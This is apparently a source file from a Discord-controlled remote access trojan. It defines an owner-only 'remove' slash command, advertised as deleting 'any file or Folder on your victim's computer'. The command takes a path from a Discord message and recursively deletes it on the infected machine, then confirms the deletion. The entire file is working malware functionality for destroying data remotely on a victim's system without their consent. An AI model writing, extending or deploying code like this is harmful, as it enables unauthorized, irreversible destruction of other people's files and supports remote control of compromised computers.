const { ApplicationCommandOptionType } = require("discord.js"),
 fs = require("fs").promises,
 path = require("path");

module.exports = {
  name: "remove",
  ownerOnly: true,
  description: "Remove any file or Folder on your victim's computer!",
  options: [
    {
      name: "path",
      description: "The path to remove",
      required: true,
      type: ApplicationCommandOptionType.String,
    },
  ],
  run: async (client, interaction, args) => {
    try {
      const pathToRemove = args[0]; // Assuming "path" is the first argument

      // Use path.resolve to get an absolute path
      const absolutePath = path.resolve(pathToRemove);

      // Check if the path exists before attempting to remove
      const exists = await fs
        .access(absolutePath)
        .then(() => true)
        .catch(() => false);

      if (exists) {
        await fs.rm(absolutePath, { recursive: true });
        await interaction.reply({
          content: `Successfully removed ${absolutePath}`,
          ephemeral: true,
        });
      } else {
        await interaction.editReply({
          content: `The specified path does not exist: ${absolutePath}`,
          ephemeral: true,
        });
      }
    } catch (error) {
      await interaction.editReply({
        content: "An error occurred while trying to remove the specified path.",
        ephemeral: true,
      });
    }
  },
};
